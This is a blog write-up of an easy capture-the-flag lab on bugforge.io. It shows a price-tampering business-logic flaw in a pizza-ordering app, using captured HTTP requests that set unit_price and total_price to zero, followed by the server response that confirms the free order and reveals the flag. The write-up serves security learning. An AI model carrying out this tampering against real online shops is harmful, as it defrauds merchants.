---
title: "Cheesy Does It Business Logic Flaw"
date: 2025-12-5
author: Shawn Szczepkowski
---

In todays lab we are covering the Cheesy Does It Business Logic Flaw lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

In this lab we see an application for placing orders at a pizza shop. Todays hint is web but I would say this vulnerability falls under a broken access control or business logic vulnerabilty.

While walking through the lab we notice that the `unit_price` and `total_price` are shown in our POST request to `/api/orders`. We should try and change that to see what happens. Obviously if the customer could change the price of the order this would not be good for the company.

Let's change the `unit_price` amd `total_price` from this:
```http
POST /api/orders HTTP/2
Host: 5913a891963c.labs.bugforge.io
Content-Length: 301
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0OTg5NzkyfQ.NI9IwWWou0FJpbAKIah4IU8l3_kCRNA8LzdCSdF5RVM
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://5913a891963c.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://5913a891963c.labs.bugforge.io/checkout
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"items":[{"pizza_name":"Spicy Diavola","base_name":"Thin Crust","sauce_name":"Buffalo","size":"Medium","toppings":["Pepperoni","Jalapeños"],"quantity":1,"unit_price":13.99,"total_price":13.99,"id":1764989875102}],"delivery_address":"123 test st","phone":"5555555","payment_method":"card","notes":""}
```

To this (free):
```sh
POST /api/orders HTTP/2
Host: 5913a891963c.labs.bugforge.io
Content-Length: 293
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0OTg5NzkyfQ.NI9IwWWou0FJpbAKIah4IU8l3_kCRNA8LzdCSdF5RVM
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://5913a891963c.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://5913a891963c.labs.bugforge.io/checkout
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"items":[{"pizza_name":"Spicy Diavola","base_name":"Thin Crust","sauce_name":"Buffalo","size":"Medium","toppings":["Pepperoni","Jalapeños"],"quantity":1,"unit_price":0,"total_price":0,"id":1764989875102}],"delivery_address":"123 test st","phone":"5555555","payment_method":"card","notes":""}
```

We get a 200 ok response telling us our order was created successfully. But did it actually change the price?

In a GET request to `/api/orders/2` we confirm the price of our order did actually change, and we receive our flag. Remember folks, just because it's not an option in the UI doesn't mean it can't be changed.
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Sat, 06 Dec 2025 02:58:59 GMT
Etag: W/"1fc-YHyyMOqonPNd7pgwGj7CNSNvFeo"
X-Powered-By: Express
Content-Length: 508

{
	"id":2,
	"user_id":4,
	"order_number":"CDI-1764989935529-L0WH04WMU",
	"total_price":0,"status":"received",
	"delivery_address":"123 test st","phone":"5555555",
	"payment_method":"card","notes":"",
	"created_at":"2025-12-06 02:58:55",
	"updated_at":"2025-12-06 02:58:55",
	"items":[
	  {
	    "id":2,"order_id":2,
	    "pizza_name":"Spicy Diavola",
	    "base_name":"Thin Crust",
	    "sauce_name":"Buffalo",
	    "size":"Medium",
	    "quantity":1,
	    "unit_price":0,
	    "total_price":0,
	    "toppings":"Jalapeños, Pepperoni"
	  } 
	],
	"flag":"bug{c407de2cf2e5007c7147e498dce9eec3}"
}
```
